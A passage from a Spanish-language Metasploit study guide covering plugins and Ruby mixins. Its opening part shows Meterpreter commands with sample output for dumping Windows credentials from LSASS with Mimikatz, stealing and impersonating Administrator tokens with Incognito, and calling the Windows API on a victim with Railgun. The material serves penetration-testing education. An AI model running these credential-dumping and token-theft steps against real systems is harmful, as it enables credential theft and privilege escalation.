**Nota Importante**: El plugin pre-instalado es **versión 1** (antigua). Para funcionalidad completa, usa el módulo de post-explotación `post/windows/gather/smart_hashdump` o carga Mimikatz manualmente.

**Uso Típico**:

```bash
# En sesión Meterpreter
meterpreter > load mimikatz
[*] Mimikatz loaded successfully

meterpreter > mimikatz_command -f sekurlsa::logonpasswords

Username: admin
Domain: WORKGROUP
NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709
Password: P@ssw0rd123  ← ¡Contraseña en texto plano!
```

**¿Por qué funciona?**: Windows guarda credenciales en memoria (proceso LSASS). Mimikatz las extrae.

#### 4. Incognito Plugin

**¿Qué hace?**: Permite **robar tokens** de otros usuarios en Windows.

**¿Qué es un token?**

```
USUARIO ADMIN hace login:
  ↓
Windows crea un TOKEN:
  - "Este proceso pertenece a Admin"
  - "Tiene permisos de Admin"
  - "Puede hacer X, Y, Z"
  ↓
Procesos del Admin usan ese TOKEN
```

**Incognito te permite**:
1. Listar tokens disponibles en el sistema
2. "Robar" un token de otro usuario
3. Impersonar a ese usuario (actuar como si fueras él)

**Ejemplo**:

```bash
meterpreter > use incognito
[*] Incognito loaded

meterpreter > list_tokens -u

Delegation Tokens Available
============================
NT AUTHORITY\SYSTEM
CORP\Administrator
CORP\Bob

meterpreter > impersonate_token "CORP\\Administrator"
[+] Successfully impersonated user CORP\Administrator

meterpreter > getuid
Server username: CORP\Administrator  ← ¡Ahora eres Admin!
```

**Caso de Uso Real**:

```
ESCENARIO:
  - Comprometiste PC de Bob (usuario normal)
  - Bob NO es admin
  - Pero el Admin hizo login remoto en la PC de Bob
  - Su token sigue en memoria
  
SOLUCIÓN:
  1. list_tokens → Ves token de Admin
  2. impersonate_token Admin
  3. ¡Ahora tienes privilegios de Admin!
```

#### 5. Railgun Plugin

**¿Qué hace?**: Permite llamar **directamente** a funciones de la Windows API desde Meterpreter.

**Nivel**: Avanzado

**Ejemplo**:

```ruby
# Llamar a MessageBoxA de la Windows API
meterpreter > irb
[*] Starting IRB shell...

>> client.railgun.user32.MessageBoxA(0, "Hola desde Metasploit", "Mensaje", "MB_OK")
=> {"GetLastError"=>0, "return"=>1}
```

**Resultado**: Se abre un MessageBox en la pantalla de la víctima que dice "Hola desde Metasploit".

**Usos Reales**:
- Manipular procesos
- Leer/escribir memoria
- Modificar registry
- Crear servicios
- Controlar dispositivos

**¿Por qué es poderoso?**: Tienes acceso **completo** a TODO lo que Windows puede hacer.

**Analogía**: Es como tener las **llaves maestras** de Windows - puedes abrir cualquier puerta.

---

## 🧬 Mixins en Ruby

> "The Metasploit Framework is written in Ruby, an object-oriented programming language. This plays a big part in what makes msfconsole excellent to use."

### ¿Qué son los Mixins?

**Definición Técnica**:
> Mixins are classes that act as methods for use by other classes without having to be the parent class of those other classes.

**Definición Simple**: Son "paquetes de funcionalidad" que puedes **incluir** en tus clases sin necesidad de herencia.

### Analogía: El Restaurante Modular

```
RESTAURANTE TRADICIONAL (Herencia):

RestauranteItaliano hereda de Restaurante
  - Puede cocinar (método heredado)
  - Puede servir (método heredado)
  - Solo puede hacer comida italiana

RestauranteMexicano hereda de Restaurante
  - Puede cocinar (método heredado)
  - Puede servir (método heredado)
  - Solo puede hacer comida mexicana

Problema: ¿Qué pasa si quieres un restaurante que haga
          TANTO comida italiana COMO mexicana?
          
No puedes heredar de dos clases (herencia múltiple no existe en Ruby)
```

```
RESTAURANTE MODULAR (Mixins):

Restaurante
  include CocinaItaliana  ← Mixin 1
  include CocinaMexicana  ← Mixin 2
  include ServicioMesa    ← Mixin 3
  include Delivery        ← Mixin 4

Ahora tienes:
  - Todos los métodos de CocinaItaliana
  - Todos los métodos de CocinaMexicana
  - Todos los métodos de ServicioMesa
  - Todos los métodos de Delivery
  
¡Sin necesidad de herencia múltiple!
```

### Ejemplo en Código Ruby

```ruby
# Definir un Mixin
module CocinaItaliana
  def hacer_pizza
    puts "🍕 Haciendo pizza..."
  end
  
  def hacer_pasta
    puts "🍝 Haciendo pasta..."
  end
end

module CocinaMexicana
  def hacer_tacos
    puts "🌮 Haciendo tacos..."
  end
  
  def hacer_burritos
    puts "🌯 Haciendo burritos..."
  end
end

# Usar Mixins
class Restaurante
  include CocinaItaliana  # ← "incluir" el mixin
  include CocinaMexicana  # ← "incluir" otro mixin
end

# Ahora el restaurante puede hacer TODO
restaurante = Restaurante.new
restaurante.hacer_pizza      # 🍕 Funciona
restaurante.hacer_tacos      # 🌮 Funciona también
restaurante.hacer_pasta      # 🍝 Funciona
restaurante.hacer_burritos   # 🌯 Funciona
```

**Sin Mixins** tendrías que:
1. Copiar/pegar todo el código en cada clase (código duplicado)
2. O usar herencia (limitado a UNA clase padre)

**Con Mixins**:
- ✅ Reutilizas código
- ✅ Puedes incluir MÚLTIPLES mixins
- ✅ Flexibilidad máxima

### ¿Por Qué Metasploit Usa Mixins?

El material dice:

> "They are mainly used when we:
> - Want to provide a lot of optional features for a class.
> - Want to use one particular feature for a multitude of classes."

**Traducido a Metasploit**:

#### Caso 1: Características Opcionales

```ruby
# Exploit base
class MyExploit < Msf::Exploit::Remote
  include Msf::Exploit::Remote::Tcp  # ← Mixin para TCP
  # Ahora tienes connect(), disconnect(), etc.
  
  include Msf::Exploit::FILEFORMAT   # ← Mixin para archivos
  # Ahora tienes file_create(), etc.
end
```

**Sin Mixins**: Tendrías que **copiar todo el código TCP** en cada exploit que use TCP. Imagina 500 exploits, todos con el mismo código copiado. Pesadilla de mantenimiento.

**Con Mixins**: `include Msf::Exploit::Remote::Tcp` y listo - tienes toda la funcionalidad TCP.

#### Caso 2: Una Característica para Muchas Clases

```ruby
# Mixin de escaneo
module Msf::Auxiliary::Scanner
  def run_host(ip)
    # Lógica de escaneo
  end
  
  def run_batch(ips)
    # Escanear múltiples IPs
  end
end

# Ahora MUCHOS módulos pueden usarlo
class HttpScanner < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
end

class SshScanner < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
end

class SmbScanner < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
end
```

**Todos estos scanners** (HTTP, SSH, SMB) comparten la **misma lógica de escaneo** (cómo iterar sobre IPs, cómo manejar threads, etc.).

**Sin Mixins**: Cada scanner tendría código duplicado.

**Con Mixins**: Un mixin, infinitos scanners.

### Ejemplo Real de Metasploit

```ruby
# Archivo: /usr/share/metasploit-framework/lib/msf/core/exploit/tcp.rb

module Msf
module Exploit::Remote::Tcp
  
  def connect(global = true, opts = {})
    # Código para conectar vía TCP
  end
  
  def disconnect(conn = nil)
    # Código para desconectar
  end
  
  def send_request(req)
    # Código para enviar request
  end
  
  # ... más métodos
end
end
```

Ahora **cualquier exploit** puede hacer:

```ruby
class MyExploit < Msf::Exploit::Remote
  include Msf::Exploit::Remote::Tcp  # ← Incluir el mixin
  
  def exploit
    connect()                    # ← Método del mixin
    send_request("GET / HTTP/1.1")  # ← Método del mixin
    disconnect()                 # ← Método del mixin
  end
end
```

**Ventaja**: El autor del exploit **NO tiene que saber** cómo implementar TCP. Solo usa los métodos que el mixin provee.

### ¿Necesitas Saber Esto Para Usar Metasploit?

> "If we are just starting with Metasploit, we should not worry about the use of Mixins or their impact on our assessment."

**Respuesta**: **NO**, no necesitas entender Mixins para:
- Usar msfconsole
- Ejecutar exploits
- Hacer pentesting básico
- Usar plugins

**SÍ necesitas entender Mixins si**:
- Quieres **desarrollar tus propios módulos**
- Quieres **crear plugins personalizados**
- Quieres **contribuir al framework**
- Te interesa el **desarrollo avanzado**

**Analogía**: No necesitas saber **cómo funciona el motor** de un auto para conducirlo. Pero si quieres **construir tu propio auto**, entonces sí necesitas saberlo.

### Recursos para Aprender Más sobre Mixins

Si te interesa profundizar:

1. **Ruby Documentation**:
   - https://ruby-doc.org/core/Module.html

2. **Artículo Mencionado en el Material**:
   - Enlace sobre mixins (el material dice "We can read more about mixins here")

3. **Metasploit Development Guide**:
   - https://docs.metasploit.com/docs/development/developing-modules/

4. **Libros**:
   - "Metasploit: The Penetration Tester's Guide"
   - "Ruby Programming Language" por David Flanagan

---

## 🎓 Resumen Ejecutivo

### Conceptos Clave Aprendidos

**1. ¿Qué son los Plugins?**
- Software de terceros integrado en Metasploit
- Pueden ser comerciales (Nessus) o proyectos individuales (DarkOperator)
- Traen funcionalidad de herramientas externas a msfconsole

**2. ¿Por Qué Usarlos?**
- Evitan cambio constante entre herramientas
- Documentación automática en database
- Configuración compartida
- Visión at-a-glance de hosts/services/vulns

**3. Ubicación y Uso**
- Directorio: `/usr/share/metasploit-framework/plugins`
- Cargar: `load nombre_plugin`
- Ver ayuda: `nombre_plugin_help`
- Descargar: `unload nombre_plugin`

**4. Instalación Manual**
- Clonar repositorio (ej: DarkOperator's)
- Copiar `.rb` a directorio de plugins
- Verificar permisos (644)
- Cargar con `load`

**5. Plugins Populares**
- nMap, Nessus, NexPose, OpenVAS (scanners)
- Mimikatz, Incognito (credenciales/tokens Windows)
- Railgun (Windows API calls)
- Stdapi, Priv (post-exploitation)

**6. Mixins en Ruby**
- Paquetes de funcionalidad reutilizable
- Se incluyen con `include`
- Permiten compartir código entre clases
- No necesitas entenderlos para usar MSF

### Comandos de Referencia Rápida

```bash
# Ver plugins disponibles
$ ls /usr/share/metasploit-framework/plugins

# Dentro de msfconsole
load plugin_name        # Cargar plugin
plugin_name_help        # Ver comandos disponibles
unload plugin_name      # Descargar plugin

# Instalar plugin custom
$ git clone https://github.com/darkoperator/Metasploit-Plugins
$ sudo cp plugin.rb /usr/share/metasploit-framework/plugins/
$ sudo chmod 644 /usr/share/metasploit-framework/plugins/plugin.rb
```

### Workflow Típico con Plugins

```
1. load nessus
2. nessus_connect localhost:8834 admin pass
3. nessus_scan_new 1 "Pentest" 192.168.1.0/24
4. nessus_scan_start scan_id
5. [wait for scan]
6. nessus_report_vulns scan_id
7. vulns → Ver vulnerabilidades importadas
8. use exploit/... → Explotar basándote en vulns
```

### Mejores Prácticas

✅ **Usa plugins para automatizar**  
✅ **Familiarízate con los pre-instalados primero**  
✅ **Lee la documentación de cada plugin antes de usar**  
✅ **Mantén plugins actualizados** (`apt upgrade`)  
✅ **Verifica permisos al instalar plugins custom**  

❌ **No uses vuln_exploit ciegamente** (puede ser destructivo)  
❌ **No confíes solo en automatización** (verifica resultados)  
❌ **No instales plugins de fuentes no confiables**  

### Próximos Pasos

Para dominar plugins:
1. ✅ Practica con plugins pre-instalados (nmap, nessus)
2. ✅ Instala DarkOperator's pentest plugin
3. ✅ Lee la documentación de cada plugin
4. ✅ Experimenta en lab controlado
5. ✅ Si te interesa desarrollo, aprende Ruby basics

**Los plugins transforman Metasploit de una herramienta poderosa a una plataforma completa de pentesting.** 🚀

---

**¡Sección 8: Plugins - Completada!** 🎯
